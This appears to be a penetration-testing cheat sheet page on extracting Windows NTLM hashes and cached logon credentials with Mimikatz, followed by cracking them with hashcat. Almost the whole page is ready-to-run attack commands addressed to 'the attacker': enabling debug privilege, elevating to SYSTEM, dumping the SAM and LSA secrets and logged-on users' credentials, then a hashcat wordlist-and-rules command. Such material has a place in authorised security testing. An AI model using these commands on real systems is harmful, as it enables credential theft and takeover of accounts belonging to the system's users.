---
legal-banner: true
---

### **PREREQUISITES:**

- The attacker must have an account or a shell on the target server.
- The attacker requires administrative privileges.

### **EXTRACTING NTLM HASHES WITH MIMIKATZ**

1.  To check which users exist locally on the system, run:  
    `Get-LocalUser`
    
2.  Navigate to the Mimikatz directory and start Mimikatz with:  
    `.\mimikatz.exe`  
    
??? info "NOTE"

    Administrative privileges are required.

3.  Enable the debug privilege using:  
    `privilege::debug`
    
4.  Elevate privileges to SYSTEM using:  
    `token::elevate`
    
5.  Extract NTLM hashes from the SAM database:  
    `lsadump::sam`  
    `lsadump::lsa /patch`
    
6. Dump Credentials of All Logged-On Users:   
    `sekurlsa::logonpasswords`

??? info "NOTE"

    This command will dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.    

### **CRACKING NTLM HASHES WITH HASHCAT**

1. Save the NTLM hash to a file (e.g., `NTLM.hash`) using:  
    `echo "3ae8e5f0ffabb3a627672e1600f1ba10" > NTLM.hash`
    
2.  Identify the Correct Hashcat Mode for NTLM:    
    `hashcat --help | grep -i "ntlm"`  
    **NOTE:** The output should indicate mode `1000` for NTLM.
    
3.  Start the Cracking Process with Hashcat:   
    `hashcat -m 1000 NTLM.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`